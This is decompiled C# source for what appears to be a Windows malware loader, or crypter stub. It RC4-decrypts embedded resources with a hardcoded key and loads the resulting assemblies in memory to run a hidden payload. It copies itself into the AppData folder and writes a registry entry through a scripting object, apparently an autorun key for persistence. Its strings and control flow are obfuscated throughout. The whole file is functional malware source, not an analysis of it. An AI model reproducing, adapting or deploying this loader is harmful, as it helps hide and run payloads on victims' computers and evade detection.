using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

[StandardModule]
internal sealed class Class0
{
	private static MethodInfo methodInfo_0;

	private static Environment.SpecialFolder specialFolder_0 = Environment.SpecialFolder.ApplicationData;

	private static string string_0 = Environment.GetFolderPath(specialFolder_0) + smethod_1("pGO3piOjLEFrash6ZbCGTS30hIrcEKEW2VjA/6jBKlaqfX6ual8n");

	[STAThread]
	public static void Main()
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		ResourceManager resourceManager = default(ResourceManager);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				decimal num6;
				switch (try0000_dispatch)
				{
				default:
				{
					num = 1;
					decimal num5 = default(decimal);
					goto IL_000b;
				}
				case 148:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000b;
						case 3:
							goto IL_0016;
						case 4:
							goto IL_001d;
						case 5:
							goto IL_0035;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0035:
					num = 5;
					smethod_3(smethod_2(smethod_0((byte[])resourceManager.GetObject(smethod_1("lVyzoieiKF4=")))));
					break;
					IL_000b:
					num = 2;
					num6 = default(decimal);
					goto IL_0016;
					IL_0016:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_001d;
					IL_001d:
					num = 4;
					resourceManager = new ResourceManager(smethod_1("lVyzoieiKF4="), Assembly.GetExecutingAssembly());
					goto IL_0035;
					end_IL_0000_2:
					break;
				}
				num = 6;
				smethod_4();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 148;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] smethod_0(byte[] byte_0)
	{
		byte[] bytes = Encoding.UTF8.GetBytes("d63Jb72ye85xX");
		uint[] array = new uint[256];
		checked
		{
			byte[] array2 = new byte[byte_0.Length - 1 + 1];
			int num = 0;
			do
			{
				array[num] = (uint)num;
				num++;
			}
			while (num <= 255);
			int num2 = 0;
			uint num3 = default(uint);
			do
			{
				num3 = (uint)(unchecked((long)checked(num3 + bytes[unchecked(num2 % bytes.Length)] + array[num2])) & 0xFFL);
				uint num4 = array[num2];
				array[num2] = array[(int)num3];
				array[(int)num3] = num4;
				num2++;
			}
			while (num2 <= 255);
			uint num5 = 0u;
			num3 = 0u;
			int num6 = array2.Length - 1;
			for (int i = 0; i <= num6; i++)
			{
				num5 = (uint)((unchecked((long)num5) + 1L) & 0xFFL);
				num3 = (uint)(unchecked((long)checked(num3 + array[(int)num5])) & 0xFFL);
				uint num4 = array[(int)num5];
				array[(int)num5] = array[(int)num3];
				array[(int)num3] = num4;
				array2[i] = (byte)(byte_0[i] ^ array[(int)(unchecked((long)checked(array[(int)num5] + array[(int)num3])) & 0xFFL)]);
			}
			return array2;
		}
	}

	public static string smethod_1(string string_1)
	{
		return Encoding.UTF8.GetString(smethod_0(Convert.FromBase64String(string_1)));
	}

	public static byte[] smethod_2(byte[] byte_0)
	{
		if ((object)methodInfo_0 == null)
		{
			ResourceManager resourceManager = new ResourceManager(smethod_1("kBysomG8aho="), Assembly.GetExecutingAssembly());
			methodInfo_0 = Assembly.Load(smethod_0((byte[])resourceManager.GetObject(smethod_1("kBysomG8aho=")))).GetType(smethod_1("uVy9rTi6OgBFe/hZebE="))!.GetMethod(smethod_1("vEu9qjy8LUt+bQ=="));
		}
		return (byte[])methodInfo_0.Invoke(null, new object[1] { byte_0 });
	}

	public static void smethod_3(byte[] byte_0)
	{
		ResourceManager resourceManager = new ResourceManager(smethod_1("yV3vrz2vOko="), Assembly.GetExecutingAssembly());
		ArrayList arrayList = new ArrayList();
		arrayList.Add(byte_0);
		Assembly.Load(smethod_2(smethod_0((byte[])resourceManager.GetObject(smethod_1("yV3vrz2vOko="))))).GetType(smethod_1("sQ=="))!.GetMethod(smethod_1("qGs="))!.Invoke(null, new object[1] { arrayList });
	}

	public static void smethod_4()
	{
		if (Operators.CompareString(Application.get_ExecutablePath(), string_0, false) != 0)
		{
			if (!Directory.Exists(Path.GetDirectoryName(string_0)))
			{
				Directory.CreateDirectory(Path.GetDirectoryName(string_0));
			}
			File.Delete(string_0);
			FileSystem.FileCopy(Application.get_ExecutablePath(), string_0);
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(smethod_1("j129tzi8KwB+dvFFcA=="), ""));
			object[] array = new object[2]
			{
				smethod_1("sGWdkA2fEGhZSdV7WZ+/QSPauJzBALwp60Ly7K7YNWWOZ2Lyakk2uRysvXs0ucSgNtvAfLW2pVbg8IE="),
				string_0
			};
			bool[] array2 = new bool[2] { false, true };
			NewLateBinding.LateCall(objectValue, (Type)null, "regwrite", array, (string[])null, (Type[])null, array2, true);
			if (array2[1])
			{
				string_0 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
			}
		}
	}
}
